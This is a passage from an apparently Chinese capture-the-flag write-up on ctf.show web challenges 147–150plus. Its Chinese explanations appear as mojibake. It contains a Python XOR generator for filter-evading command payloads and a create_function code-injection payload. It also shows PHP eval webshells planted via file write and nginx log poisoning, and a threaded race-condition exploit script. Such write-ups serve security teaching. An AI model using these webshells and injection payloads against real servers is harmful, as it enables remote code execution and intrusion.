class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/16 10:23</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">op_dict = &#123;</span><br><span class="line">    <span class="string">&quot;yes_op&quot;</span>: <span class="keyword">lambda</span> x: x,</span><br><span class="line">    <span class="string">&quot;not_op&quot;</span>: <span class="keyword">lambda</span> x: <span class="keyword">not</span> x,</span><br><span class="line">    <span class="string">&quot;or_op&quot;</span>: <span class="keyword">lambda</span> x, y: x | y,</span><br><span class="line">    <span class="string">&quot;xor_op&quot;</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sign = &#123;</span><br><span class="line">    <span class="string">&#x27;xor_op&#x27;</span>: <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;or_op&#x27;</span>:<span class="string">&#x27;|&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_coding</span>(<span class="params">file_name, pattern, is_match, mode</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ç”Ÿæˆç¬¦åˆè¦æ±‚çš„ç¼–ç </span></span><br><span class="line"><span class="string">    @param file_name: ç”Ÿæˆæ–‡ä»¶çš„åç§°</span></span><br><span class="line"><span class="string">    @param pattern: æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="string">    @param is_match: æ˜¯å¦åŒ¹é…æ­£åˆ™ï¼ŒTrueè¡¨ç¤ºåŒ¹é…ï¼ŒFalseè¡¨ç¤ºä¸åŒ¹é…</span></span><br><span class="line"><span class="string">    @param mode: ç¼–ç æ–¹å¼</span></span><br><span class="line"><span class="string">    @return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                op = op_dict[<span class="string">&#x27;not_op&#x27;</span>] <span class="keyword">if</span> is_match <span class="keyword">else</span> op_dict[<span class="string">&#x27;yes_op&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœå½“å‰å¤–å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥è·³è¿‡æ‰€æœ‰å†…å±‚å¾ªç¯</span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(i))):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># å¦‚æœå½“å‰å†…å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œè·³è¿‡è¯¥å…ƒç´ </span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(j))):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># [2:]æ˜¯å› ä¸ºpythonä¸­hexè¡¨ç¤ºæ˜¯0xffè¿™æ ·çš„å½¢å¼ï¼Œå»æ‰å‰é¢çš„0xï¼Œç»„æˆ2ä½urlç¼–ç </span></span><br><span class="line">                hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="comment"># urlç¼–ç çš„æ–¹å¼å’ŒASCIIç ä¸€æ ·ï¼Œä½†éœ€è¦åœ¨å‰é¢åŠ ä¸Š%</span></span><br><span class="line">                url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">                url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">                <span class="comment"># cæ˜¯æˆ‘ä»¬è¦æ„é€ çš„å‚æ•°ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦ä¼ lså‘½ä»¤ï¼Œlå°±è¦æ‹†åˆ†æˆa|bï¼Œå…¶ä¸­|æ˜¯å› ä¸ºé¢˜ç›®æ²¡æœ‰è¿‡æ»¤|ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆå…¶ä»–ä»»æ„æ“ä½œå¦‚^</span></span><br><span class="line">                c = op_dict[mode](<span class="built_in">ord</span>(urllib.parse.unquote(url_i)), <span class="built_in">ord</span>(urllib.parse.unquote(url_j)))</span><br><span class="line">                <span class="comment"># å¦‚æœcæ˜¯å¯è§çš„å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">if</span> c &gt;= <span class="number">32</span> <span class="keyword">and</span> c &lt;= <span class="number">126</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c) + <span class="string">&quot; &quot;</span> + url_i + <span class="string">&quot; &quot;</span> + url_j + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg,file_name,mode</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(file_name, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;&quot;</span>+sign[mode]+<span class="string">&quot;\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;rce.txt&#x27;</span></span><br><span class="line">mode = <span class="string">&#x27;xor_op&#x27;</span></span><br><span class="line">reg = <span class="string">&#x27;^\W+$&#x27;</span></span><br><span class="line">generate_coding(file_name,reg,<span class="literal">True</span>,mode)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>),file_name,mode) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>),file_name,mode) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web147">web147</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿç‚¹ï¼šcreate_function()ä»£ç æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç±»ä¼¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo(); ç­‰ä»·äºæ‰§è¡Œåé¢çš„å‘½ä»¤</p><p><strong>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</strong></p><p>%5cå°±æ˜¯\çš„urlç¼–ç ï¼Œç›´æ¥å†™æ–œæ èƒ½è¿‡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);//</span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">get</span>: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);/*</span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">ctf</span>=\<span class="title">create_function</span></span></span><br></pre></td></tr></table></figure><h4><span id="web149">web149</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li><p>æ€è·¯ä¸€ï¼šå†™å…¥index.phpä¸€å¥è¯æœ¨é©¬</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">ctf</span>=<span class="title">index.php</span></span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">show</span>=&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();<span class="title">eval</span>($<span class="title">_POST</span>[0]);?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ€è·¯äºŒï¼šæ¡ä»¶ç«äº‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/&quot;</span>+<span class="string">&quot;?ctf=4.php&quot;</span></span><br><span class="line">        fromdata=&#123;<span class="string">&quot;show&quot;</span>:<span class="string">&quot;&lt;?php eval($_GET[&#x27;S&#x27;]);?&gt;&quot;</span>&#125;</span><br><span class="line">        response = requests.post(url=url,data=fromdata)</span><br><span class="line">        <span class="built_in">print</span>(response.status_code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cmd = &quot;system(&#x27;ls /&#x27;)&quot;</span></span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/4.php?S=system(&#x27;tac /ctfshow_fl0g_here.txt&#x27;);&quot;</span></span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># threads = []</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># t1 = threading.Thread(target=write)</span></span><br><span class="line"><span class="comment"># t2 = threading.Thread(target=read)</span></span><br><span class="line"><span class="comment"># threads.append(t1)</span></span><br><span class="line"><span class="comment"># threads.append(t2)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=write)</span><br><span class="line">        t1.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=read)</span><br><span class="line">        t2.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="comment"># for t in threads:</span></span><br><span class="line">    <span class="comment">#     t.join()</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web150">web150</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ—¥å¿—åŒ…å«</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?isVIP=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ffe1355-5551-4386-992e-70c1c9f7197b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[0]);?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>55</span><br><span class="line"></span><br><span class="line"><span class="language-arcade">ctf=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>&amp;<span class="number">0</span>=system(<span class="string">&#x27;tac flag.php&#x27;</span>);</span></span><br></pre></td></tr></table></figure><h4><span id="web150plus">web150plus</span></h4><ul><li>æ–¹æ³•ä¸€ï¼šautoload()</li></ul><blockquote><p>è¿™ä¸ªé¢˜ä¸€ç‚¹ç‚¹å°å‘__autoload()å‡½æ•°ä¸æ˜¯ç±»é‡Œé¢çš„__</p><p><code>__autoload() //åœ¨ä»£ç ä¸­å½“è°ƒç”¨ä¸å­˜åœ¨çš„ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚</code><br>class_existsä¹Ÿèƒ½è§¦å‘,ä¸è¿‡åœ¨äºæ€ä¹ˆç»™<code>$__CTFSHOW__</code>èµ‹å€¼,å› ä¸ºä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†,åªè¦èƒ½ç»•è¿‡ä¸‹åˆ’çº¿å°±å¯ä»¥äº†<br>æœ€åæ„é€ ?..CTFSHOW..&#x3D;phpinfoå°±å¯ä»¥çœ‹åˆ°phpinfoä¿¡æ¯å•¦<br>åŸå› æ˜¯..CTFSHOW..è§£æå˜é‡æˆ__CTFSHOW__ç„¶åè¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œå› ä¸ºCTFSHOWæ˜¯ç±»å°±ä¼šä½¿ç”¨<br>__autoload()å‡½æ•°æ–¹æ³•ï¼Œå»åŠ è½½ï¼Œå› ä¸ºç­‰äºphpinfoå°±ä¼šå»åŠ è½½phpinfo<br>æ¥ä¸‹æ¥å°±å»getshellå•¦</p></blockquote><ul><li><p>æ–¹æ³•äºŒï¼šæ¡ä»¶ç«äº‰</p><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSè¿›è¡Œæ–‡ä»¶åŒ…å«</a></p><blockquote><p>è¿™ä¸ªåŒ…å«æ¼æ´åœ¨php5.4ä¹‹åå¯ä»¥ä½¿ç”¨</p><p>å› ä¸ºåœ¨php5.4ä¹‹åphp.iniå¼€å§‹æœ‰äº†å‡ ä¸ªsessionçš„é»˜è®¤é€‰é¡¹</p><p>1.session.upload_progress.enabled &#x3D; on<br>2.session.upload_progress.cleanup &#x3D; on<br>3.session.upload_progress.prefix &#x3D; â€œupload_progress_â€<br>4.session.upload_progress.name &#x3D; 